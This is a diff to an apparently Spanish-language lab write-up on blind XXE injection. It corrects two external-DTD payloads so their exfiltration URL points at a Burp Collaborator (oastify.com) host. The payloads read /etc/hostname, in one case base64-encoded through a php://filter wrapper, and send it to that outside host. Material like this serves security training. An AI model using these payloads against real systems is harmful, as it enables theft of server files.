@@ -80,7 +80,7 @@ Lo que podemos hacer ahora que hemos confirmado que podemos `cargar` un `recurso
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m?content=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com?content=%file;'>">
 %eval;
 %exfil;
 ```
@@ -89,7 +89,7 @@ En este laboratorio no funciona, pero podríamos usar este `wrapper` de `php` pa
 
 ```
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m?content=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com?content=%file;'>">
 %eval;
 %exfil;
 ```
